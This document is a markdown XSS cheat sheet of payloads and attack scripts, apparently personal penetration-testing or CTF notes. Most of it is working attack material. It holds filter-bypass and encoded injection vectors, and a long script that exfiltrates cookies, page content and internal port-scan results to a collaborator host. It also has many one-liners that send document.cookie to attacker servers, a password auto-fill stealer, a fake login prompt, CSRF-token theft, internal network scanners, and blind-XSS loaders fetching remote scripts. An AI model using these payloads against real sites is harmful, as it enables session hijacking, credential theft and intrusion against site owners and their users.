# XSS (Cross Site Scripting)
**Web Content-Types to XSS**

The following content types can execute XSS in all browsers:
* `text/html`
* `application/xhtml+xml`
* `application/xml`
* `text/xml`
* `image/svg+xml`
* `text/plain` (?? not in the list but I think I saw this in a CTF)
* `application/rss+xml` (off)
* `application/atom+xml` (off)

In other browsers other Content-Types can be used to execute arbitrary JS, check:

https://github.com/BlackFan/content-type-research/blob/master/XSS.md


## XSS Tips
* If your input is placed in the following tags, you must first exit these tags:
    * `<title>`
    * `<script>`
    * `<textarea>`
    * `<noscript>`
    * `<style>`
    
* Magic events - If all events and tags were closed, use personal tags for this purpose:
    * `onmouseover`
    * `onclick`
    * `oncopy`

For Example: `<mehdi onmouseover=alert(1)>Hello mehdi0x90</mehdi>`

* One of the places that can be used for XSS is the href tag. Even if your input is encoded and you cannot get out of the tag:
    * `href="javascript:alert(1)"`
* If the system does not allow quotes of any kind, you can `eval()` a fromCharCode in JavaScript to create any XSS vector you need:
    * `<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>`
* Since XSS examples that use a javascript: directive inside an `<IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:
    * `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>`

-----

**xml Content Type**

If the page is returnin a text/xml content-type it's possible to indicate a namespace and execute arbitrary JS
```javascript
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->

```

**Injecting inside raw HTML**

```javascript

<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>

```
**Blacklist Bypasses**

```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //

```
**Length bypass (small XSSs)**

```javascript

<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>

```
**Injecting inside HTML tag**

```javascript
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t

//Style events
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
**Bypass inside event using HTML encoding/URL encode**
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>

//Note that URL encode will also work
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>

//Bypass inside event using Unicode encode
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />

```
**Special Protocols Within the attribute**

There you can use the protocols javascript: or data: in some places to execute arbitrary JS code. Some will require user interaction on some won't.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line 
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==

```

**Places where you can inject these protocols**
```javascript
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf 
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf 
<iframe srcdoc="<svg onload=alert(4);>">

```
**Other obfuscation tricks**
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">

&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>

//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />

```

**Reverse tab nabbing**

If you can inject any URL in an arbitrary <a href= tag that contains the target="_blank" and rel="opener" attributes
```javascript

<a target="_blank" rel="opener"

```

**on Event Handlers Bypass**
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B

```
**XSS in "Unexploitable tags" (hidden input, link, canonical, meta)**
```javascript
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>

//And in meta tags
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>


//You can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**Inside JS code**

If <> are being sanitised you can still escape the string where your input is being located and execute arbitrary JS. It's important to fix JS syntax, because if there are any errors, the JS code won't be executed
```javascript
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//

```
**Template literals ``**


In order to construct strings apart from single and double quotes JS also accepts backticks `` . This is known as template literals as they allow to embedded JS expressions using ${ ... } syntax.
Therefore, if you find that your input is being reflected inside a JS string that is using backticks, you can abuse the syntax ${ ... } to execute arbitrary JS code
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`

// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````

```
**Encoded code execution**
```javascript
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">

```

**Unicode Encode JS execution**
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)

```
**Arbitrary function (alert) call**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie']) 
with(document)alert(cookie) 
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>

```
**PHP FILTER_VALIDATE_EMAIL flag Bypass**
```javascript

"><svg/onload=confirm(1)>"@x.y

```
**Ruby-On-Rails bypass**

Due to RoR mass assignment quotes are inserted in the HTML and then the quote restriction is bypassed and additoinal fields (onfocus) can be added inside the tag.
Form example, if you send the payload:
```javascript

contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa


//The pair "Key","Value" will be echoed back like this
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}

```

**Special combinations**
```javascript
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">

```

**Cross-site scripting (XSS) cheat sheet**

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


**Special Replacement Patterns**

When something like `"some {{template}} data".replace("{{template}}", <user_input>)` is used. The attacker could use special string replacements to try to bypass some protections: **"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))**

https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA

**Steal Info JS**

```javascript
// SELECT HERE THE EXFILTRATION MODE (more than 1 can be selected)
// If any GET method is selected (like location or RQ_GET), it's recommended to exfiltrate each info 1 by 1
var ATTACKER_SERVER = "https://weecosb5a2k7jc0cwlyksg9qzh57tw.burpcollaborator.net"
var EXFIL_BY_IMG = false
var EXFIL_BY_RQ_GET = false
var EXFIL_BY_RQ_POST = true
var EXFIL_BY_FETCH_GET = false
var EXFIL_BY_FETCH_POST = false
var EXFIL_BY_NAV = false

var EXFIL_BY_LOC = false
var ALL_INFO = "" // Only used by Location exfiltration


// Function to make the data possible to transmit via either GET or POST
function encode(text){
    return encodeURI(btoa(text));
}

// Functions to exfiltrate the information
function exfil_info(info_name, text, is_final=false){
    if (EXFIL_BY_IMG)               exfil_by_img(info_name, text);
    if (EXFIL_BY_RQ_GET)            exfil_by_rq_get(info_name, text);
    if (EXFIL_BY_RQ_POST)           exfil_by_rq_post(info_name, text);
    if (EXFIL_BY_FETCH_GET)         exfil_by_fetch_get(info_name, text);
    if (EXFIL_BY_FETCH_POST)        exfil_by_fetch_post(info_name, text);
    if (EXFIL_BY_NAV)               exfil_by_nav(info_name, text);
    if (EXFIL_BY_LOC){
        if (is_final) exfil_by_loc(info_name, text);
        else ALL_INFO += "\n\n" + info_name + "=" + text;
    }
}

function exfil_by_img(info_name, text){
    new Image().src = ATTACKER_SERVER + "/exfil_by_img/" + info_name + "?" + info_name + "=" + text
}

function exfil_by_rq_get(info_name, text){
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", ATTACKER_SERVER + "/exfil_by_rq_get/" + info_name + "?" + info_name + "=" + text, true);
    xhttp.send();
}

function exfil_by_rq_post(info_name, text){
    var xhttp = new XMLHttpRequest();
    xhttp.open("POST", ATTACKER_SERVER + "/exfil_by_rq_post/" + info_name, true);
    xhttp.send(text);
}

function exfil_by_fetch_get(info_name, text){
    fetch(ATTACKER_SERVER + "/exfil_by_fetch_get/" + info_name + "?" + info_name + "=" + text, {method: 'GET', mode: 'no-cors'});
}

function exfil_by_fetch_post(info_name, text){
    fetch(ATTACKER_SERVER + "/exfil_by_fetch_post/" + info_name, {method: 'POST', mode: 'no-cors', body: text});
}

function exfil_by_nav(info_name, text){
    navigator.sendBeacon(ATTACKER_SERVER + "/exfil_by_nav/" + info_name, text)
}

function exfil_by_loc(info_name, text){
    document.location = ATTACKER_SERVER + "/exfil_by_loc/?a=" + encode(ALL_INFO);
}


// Functions to get the data to exfiltrate
function exfil_page_content(url){
    var xhr  = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            exfil_info(url, encode(xhr.responseText));
        }
    }
    xhr.open('GET', url, true);
    xhr.send(null);
}

function exfil_internal_port(port){
    fetch("http://127.0.0.1:" + port + "/", { mode: "no-cors" }).then(() => { 
        exfil_info("internal_port", encode(port));
    });
}


// Info to exfiltrate
exfil_info("cookies", encode(document.cookie));
exfil_info("current_url", encode(document.URL));
exfil_info("current_content", encode(document.documentElement.innerHTML));
exfil_page_content("/");
exfil_page_content("/admin"); // If 404 nothing will be sent
exfil_page_content("/flag");
exfil_page_content("/flag.txt");

top_1000 = [1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1102,1104,1105,1106,1107,1108,1110,1111,1112,1113,1114,1117,1119,1121,1122,1123,1124,1126,1130,1131,1132,1137,1138,1141,1145,1147,1148,1149,1151,1152,1154,1163,1164,1165,1166,1169,1174,1175,1183,1185,1186,1187,1192,1198,1199,1201,1213,1216,1217,1218,1233,1234,1236,1244,1247,1248,1259,1271,1272,1277,1287,1296,1300,1301,1309,1310,1311,1322,1328,1334,1352,1417,1433,1434,1443,1455,1461,1494,1500,1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687,1688,1700,1717,1718,1719,1720,1721,1723,1755,1761,1782,1783,1801,1805,1812,1839,1840,1862,1863,1864,1875,1900,1914,1935,1947,1971,1972,1974,1984,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2013,2020,2021,2022,2030,2033,2034,2035,2038,2040,2041,2042,2043,2045,2046,2047,2048,2049,2065,2068,2099,2100,2103,2105,2106,2107,2111,2119,2121,2126,2135,2144,2160,2161,2170,2179,2190,2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381,2382,2383,2393,2394,2399,2401,2492,2500,2522,2525,2557,2601,2602,2604,2605,2607,2608,2638,2701,2702,2710,2717,2718,2725,2800,2809,2811,2869,2875,2909,2910,2920,2967,2968,2998,3000,3001,3003,3005,3006,3007,3011,3013,3017,3030,3031,3052,3071,3077,3128,3168,3211,3221,3260,3261,3268,3269,3283,3300,3301,3306,3322,3323,3324,3325,3333,3351,3367,3369,3370,3371,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,3826,3827,3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000,4001,4002,4003,4004,4005,4006,4045,4111,4125,4126,4129,4224,4242,4279,4321,4343,4443,4444,4445,4446,4449,4550,4567,4662,4848,4899,4900,4998,5000,5001,5002,5003,5004,5009,5030,5033,5050,5051,5054,5060,5061,5080,5087,5100,5101,5102,5120,5190,5200,5214,5221,5222,5225,5226,5269,5280,5298,5357,5405,5414,5431,5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678,5679,5718,5730,5800,5801,5802,5810,5811,5815,5822,5825,5850,5859,5862,5877,5900,5901,5902,5903,5904,5906,5907,5910,5911,5915,5922,5925,5950,5952,5959,5960,5961,5962,5963,5987,5988,5989,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6009,6025,6059,6100,6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565,6566,6567,6580,6646,6666,6667,6668,6669,6689,6692,6699,6779,6788,6789,6792,6839,6881,6901,6969,7000,7001,7002,7004,7007,7019,7025,7070,7100,7103,7106,7200,7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777,7778,7800,7911,7920,7921,7937,7938,7999,8000,8001,8002,8007,8008,8009,8010,8011,8021,8022,8031,8042,8045,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8093,8099,8100,8180,8181,8192,8193,8194,8200,8222,8254,8290,8291,8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651,8652,8654,8701,8800,8873,8888,8899,8994,9000,9001,9002,9003,9009,9010,9011,9040,9050,9071,9080,9081,9090,9091,9099,9100,9101,9102,9103,9110,9111,9200,9207,9220,9290,9415,9418,9485,9500,9502,9503,9535,9575,9593,9594,9595,9618,9666,9876,9877,9878,9898,9900,9917,9929,9943,9944,9968,9998,9999,10000,10001,10002,10003,10004,10009,10010,10012,10024,10025,10082,10180,10215,10243,10566,10616,10617,10621,10626,10628,10629,10778,11110,11111,11967,12000,12174,12265,12345,13456,13722,13782,13783,14000,14238,14441,14442,15000,15002,15003,15004,15660,15742,16000,16001,16012,16016,16018,16080,16113,16992,16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221,20222,20828,21571,22939,23502,24444,24800,25734,25735,26214,27000,27352,27353,27355,27356,27715,28201,30000,30718,30951,31038,31337,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,32784,32785,33354,33899,34571,34572,34573,35500,38292,40193,40911,41511,42510,44176,44442,44443,44501,45100,48080,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49163,49165,49167,49175,49176,49400,49999,50000,50001,50002,50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600,56737,56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389]
top_1000.forEach(port => exfil_internal_port(port));

if (EXFIL_BY_LOC){
    setTimeout(exfil_info("finish", "finish", true), 5000) // exfiltrate by location after 5s
}

// Sniff info
window.onmessage = function(e){
    exfil_info("onmessage", encode(e.data))
}

```

**Retrieve Cookies**

```javascript

<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>

```

**Steal Page Content**

```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
var attacker = "http://10.10.14.8/exfil";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', url, true);
xhr.send(null);

```

**Find internal IPs**

```javascript
<script>
var q = []
var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(){
        fetchUrl(url, wait);
    }
  }('http://192.168.0.'+i+':8080'));
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for(i=1; i<=n_threads; i++){
  if(q.length) q.shift()();
}

function fetchUrl(url, wait){
    console.log(url)
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
    }
  ))
  .catch(e => {
  if(!String(e).includes("The user aborted a request") && q.length) {
    q.shift()();
  }
  });

  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()();
  }
  }, wait);
}
</script>

```

**Port Scanner (fetch)**

```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }

```

**Port Scanner (websockets)**

```javascript
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
    var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
    s.start = performance.now();
    s.port = ports[i];
    s.onerror = function() {
        console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
    };
    s.onopen = function() {
        console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
    };
}


```

**Box to ask for credentials**

```javascript
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>

```

**Auto-fill passwords capture**


```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">

```

When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.

**Keylogger**

Just searching in github I found a few different ones:
https://github.com/JohnHoder/Javascript-Keylogger
https://github.com/rajeshmajumdar/keylogger
https://github.com/hakanonymos/JavascriptKeylogger
You can also use metasploit `http_javascript_keylogger`



**Stealing CSRF tokens**

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

```



**Stealing PostMessage messages**

```javascript
<img src="https://attacker.com/?" id=message>
<script>
 window.onmessage = function(e){
 document.getElementById("message").src += "&"+e.data;
</script>

```

**Blind XSS payloads**

You can also use: https://xsshunter.com/#/


```javascript
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
